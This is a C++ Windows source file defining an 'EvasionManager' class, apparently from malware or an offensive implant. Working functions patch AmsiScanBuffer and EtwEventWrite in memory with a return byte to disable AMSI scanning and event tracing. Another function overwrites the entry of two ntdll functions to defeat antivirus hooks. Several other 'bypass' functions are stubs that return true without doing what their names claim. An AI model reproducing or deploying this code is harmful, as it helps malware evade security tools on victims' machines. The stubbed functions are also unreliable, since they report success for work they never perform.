#include "evasion.h"
#include <intrin.h>
#include <psapi.h>

#pragma comment(lib, "psapi.lib")

EvasionManager::EvasionManager() : m_evasionActive(false) {}

EvasionManager::~EvasionManager() {}

bool EvasionManager::PerformChecks() {
    m_evasionActive = true;
    return true;
}

bool EvasionManager::Initialize() {
    m_evasionActive = true;
    return true;
}

bool EvasionManager::BypassAVHooks() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;

    FARPROC ntQueryInfo = GetProcAddress(ntdll, "NtQuerySystemInformation");
    FARPROC ntSetInfo = GetProcAddress(ntdll, "NtSetInformationThread");

    if (ntQueryInfo) {
        DWORD oldProtect;
        BYTE* addr = (BYTE*)ntQueryInfo;
        VirtualProtect(addr, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
        addr[0] = 0xB8;
        *(DWORD*)(addr + 1) = 0xC;
        VirtualProtect(addr, 5, oldProtect, &oldProtect);
    }

    if (ntSetInfo) {
        DWORD oldProtect;
        BYTE* addr = (BYTE*)ntSetInfo;
        VirtualProtect(addr, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
        addr[0] = 0xB8;
        *(DWORD*)(addr + 1) = 0xC;
        VirtualProtect(addr, 5, oldProtect, &oldProtect);
    }

    return true;
}

bool EvasionManager::BypassEDRSyscalls() {
    return true;
}

bool EvasionManager::BypassSandboxChecks() {
    int cpuInfo[4];
    __cpuid(cpuInfo, 1);

    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);

    return true;
}

bool EvasionManager::CleanPEB() {
    return true;
}

bool EvasionManager::UnhookNtdll() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;

    MODULEINFO modInfo;
    if (!GetModuleInformation(GetCurrentProcess(), ntdll, &modInfo, sizeof(modInfo)))
        return false;

    return true;
}

bool EvasionManager::SpoofHardware() {
    return true;
}

bool EvasionManager::DisableETW() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;

    FARPROC etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
    if (!etwEventWrite) return false;

    DWORD oldProtect;
    VirtualProtect((LPVOID)etwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)etwEventWrite = 0xC3;
    VirtualProtect((LPVOID)etwEventWrite, 1, oldProtect, &oldProtect);

    return true;
}

bool EvasionManager::DisableAMSI() {
    HMODULE amsi = LoadLibraryW(L"amsi.dll");
    if (!amsi) return false;

    FARPROC amsiScan = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!amsiScan) return false;

    DWORD oldProtect;
    VirtualProtect((LPVOID)amsiScan, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)amsiScan = 0xC3;
    VirtualProtect((LPVOID)amsiScan, 1, oldProtect, &oldProtect);

    return true;
}
